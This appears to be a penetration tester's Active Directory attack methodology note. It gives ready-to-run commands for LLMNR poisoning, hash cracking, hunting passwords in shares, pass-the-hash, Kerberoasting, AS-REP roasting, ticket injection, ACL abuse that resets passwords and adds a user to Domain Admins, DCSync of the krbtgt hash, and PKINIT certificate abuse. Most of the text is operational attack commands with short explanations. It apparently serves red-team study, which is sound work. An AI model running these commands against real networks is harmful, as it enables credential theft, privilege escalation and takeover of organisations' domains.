---
created: 2026-10-04
updated: 2026-10-18
tags:
  - AD
  - AD_attacks
  - methodology
---
// make sure section placement is the most logical for a testing.
## AD testing methodology

>[!note]+ Each entry consists of:
>- **Cue** — an observable signal or behavior that hints at a weakness.
>- **Check** — what to probe once the cue appears, and what a positive result proves.
>- **→ Reference** — the note that covers the technique in depth.

## Enumeration & discovery

>[!note] See [[🛠️ AD enumeration & discovery]].
## Poisoning & relay

### LLMNR & NBT-NS poisoning

>[!note] See [[LLMNR & NBT-NS poisoning]].

- Capture NetNTLMv2 hashes by poisoning name resolution from Linux:

```bash
sudo responder -I eth0 -wv
```

- Poison from Windows with Inveigh:

```powershell
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y
```

- Crack captured NetNTLMv2 hashes offline:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### NTLM relay


### SMB relay


## Credential hunting in network shares

>[!note] See [[Credential hunting in network shares]].

- Crawl readable shares for credential-like content with NetExec:

```bash
nxc smb 10.10.11.5 -u jdoe -p 'passwd123' --spider IT --content --pattern "passw"
```

- Scan shares from Windows with Snaffler:

```powershell
Snaffler.exe -s
```
## Password attacks

- [[Username enumeration in AD]]
- [[Password and account lockout policies in AD]]
- [[Password spraying in AD]]
## Pass-the-Hash

- Reuse a recovered NT hash directly to authenticate and move laterally, without cracking the password.

>[!note] See [[Pass-the-Hash]].

- Authenticate and execute commands with an NT hash from Linux:

```bash
impacket-psexec -hashes :<NT_hash> <domain>/<username>@<target>
```

- Open a WinRM session with an NT hash:

```bash
evil-winrm -i <target_ip> -u <username> -H <NT_hash>
```

- Spray a local `Administrator` hash across a subnet to find reuse:

```bash
nxc smb 172.16.5.0/23 --local-auth -u administrator -H <NT_hash> | grep +
```

## Kerberos attacks

- Kerberos attacks abuse the Active Directory authentication protocol to recover credentials and impersonate accounts — requesting encrypted ticket material to crack **offline**, then forging or replaying tickets to authenticate as other principals and to persist in the domain.
### Roasting

- Recovering credentials offline
#### Kerberoasting

>[!note] See [[Kerberoasting]].

- Request service tickets for SPN accounts from Linux:

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 EXAMPLE.COM/jdoe -request -outputfile kerberoast.hashes
```

- Request tickets from Windows with Rubeus:

```powershell
Rubeus.exe kerberoast /nowrap /outfile:hashes.txt
```

- Crack the recovered tickets offline:

```bash
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt
```

#### `AS-REP` roasting

>[!note] See [[AS-REP roasting]].

- Roast accounts with Kerberos pre-authentication disabled from Linux:

```bash
GetNPUsers.py -dc-ip 172.16.5.5 EXAMPLE.COM/jdoe -request -outputfile asrep.hashes
```

- Roast from Windows with Rubeus:

```powershell
Rubeus.exe asreproast /nowrap /outfile:asrep_hashes.txt
```

- Crack the recovered hashes offline:

```bash
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```

### Ticket reuse and forgery

#### Overpass-the-Hash

>[!note] See [[Overpass-the-Hash]].

- Turn an NT hash or AES key into a Kerberos TGT from Linux:

```bash
getTGT.py -hashes :<NT_hash> <domain.com>/<user>
```

- Request and inject a TGT from Windows with Rubeus:

```powershell
Rubeus.exe asktgt /user:<user> /domain:<domain.com> /rc4:<NT_hash> /ptt
```

#### Pass-the-Ticket

>[!note] See [[Pass-the-Ticket]].

- Reuse a captured credential cache on Linux:

```bash
export KRB5CCNAME=/path/to/ticket.ccache
```

- Inject a `.kirbi` ticket into the current logon session on Windows:

```powershell
Rubeus.exe ptt /ticket:administrator.kirbi
```

#### Golden and Silver Tickets

>[!note] See [[Golden Ticket]] and [[Silver Ticket]].

- A **Golden Ticket** forges a TGT signed with the `krbtgt` account key, granting domain-wide impersonation and long-term persistence.
- A **Silver Ticket** forges a service ticket with a service account's key, granting access to one target service without ever contacting the KDC.

### Delegation and the double-hop problem

>[!note] See [[◯ Kerberos double hop problem]].

- Kerberos does not forward a user's credentials past the first remote host, so a second hop to another service fails; supply explicit credentials from the first host to reach resources beyond it.


## ACL attacks

- Abuse misconfigured object permissions — `GenericAll`, `WriteDACL`, `ForceChangePassword`, replication rights, and more — to escalate privilege and establish persistence.
### Enumerating and abusing ACLs

>[!note] See [[AD ACL attacks]].

- Find interesting, writable ACEs across the domain with PowerView:

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | Select-Object ObjectDN, IdentityReference, ActiveDirectoryRights, ObjectAceType
```

- Read the rights a specific principal holds, from Linux:

```bash
dacledit.py -action read -principal jdoe -dc-ip 10.10.11.5 'example.com/jdoe:passwd123'
```

- Abuse `ForceChangePassword` to reset a target user's password:

```bash
net rpc password EXAMPLE.COM\rwade 'new_passwd123' -U 'example.com/jdoe%passwd123' -S dc01.example.com
```

- Abuse `GenericAll`/`GenericWrite` on a group to add a member:

```powershell
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'jdoe'
```
### DCSync

>[!note] See [[DCSync]].

- With replication rights (granted by `DS-Replication-Get-Changes[-All]`), impersonate a DC to pull password hashes:

```bash
secretsdump.py -just-dc-user krbtgt domain.local/jdoe:'passwd123'@10.10.11.5
```

### Shadow Credentials

>[!note] See [[Shadow credentials]].

- Writing `msDS-KeyCredentialLink` on a target lets you add an attacker-controlled certificate to it and then authenticate via PKINIT as that account.

### Resource-based constrained delegation (RBCD)


- Writing `msDS-AllowedToActOnBehalfOfOtherIdentity` on a computer lets a controlled account impersonate any user to services on that host.

## AD CS attacks

- Abuse a misconfigured certificate services PKI to obtain certificates that authenticate as privileged accounts and survive password resets.


- Exchange a stolen or forged certificate for a Kerberos TGT via PKINIT:

```bash
gettgtpkinit.py -cert-pfx user.pfx -pfx-pass '' example.com/user user.ccache
```

- Recover the account's NT hash from the resulting PKINIT session key:

```bash
getnthash.py -key <AS-REP_key> example.com/user
```

>[!note] Certificate issuance and the related ESC misconfigurations connect to [[AD ACL attacks]] (object control that enables enrolment abuse) and [[Shadow credentials]] (key-credential-based PKINIT).

## Trust attacks

- Move beyond the current domain by abusing intra-forest and cross-forest trusts to reach the forest root and neighbouring forests.

### Within a forest (child ⇄ parent)

#### Child to parent

>[!note] See [[🛠️ Child 🡺 Parent trusts]].

- Compromise of a child domain yields the whole forest: forge a cross-domain TGT that injects the Enterprise Admins SID through SID history, since the parent trusts the child's KDC.

#### Parent to child

>[!note] See [[🛠️ Parent 🡺 Child trusts]].

- From a parent domain, reach downward into a child domain using trust keys and the shared forest trust path.

### Across forests (cross-forest)

>[!note] See [[🛠️ Cross-forest trust abuse]].

- Pivot between separate forests over an inter-forest trust by abusing foreign group memberships, shared accounts, or trust-account credentials, subject to SID filtering on the trust.

## References

- For the initial foothold on a Windows host — exploitation, payload generation, transfer, and execution — see [[🛠️ Infiltrating Windows]].
- For the AD attack tooling referenced throughout, see [[🛠️ Tools]].
